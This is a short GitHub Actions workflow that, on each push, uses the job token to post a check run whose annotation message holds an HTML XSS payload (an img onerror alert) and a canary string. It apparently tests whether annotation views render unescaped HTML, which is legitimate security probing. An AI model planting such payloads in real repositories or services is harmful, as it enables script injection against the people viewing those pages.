name: chk-annot
on: push
permissions: { checks: write, contents: read }
jobs:
  c:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/check-runs" -d "{\"name\":\"annot-xss\",\"head_sha\":\"$GITHUB_SHA\",\"status\":\"completed\",\"conclusion\":\"failure\",\"output\":{\"title\":\"t\",\"summary\":\"s\",\"annotations\":[{\"path\":\"README.md\",\"start_line\":1,\"end_line\":1,\"annotation_level\":\"failure\",\"message\":\"<img src=x onerror=alert(\x27ANNOT-DIFF-XSS\x27)> ANNOT-DIFF-CANARY\"}]}}"
        env: { GITHUB_TOKEN: "${{ github.token }}" }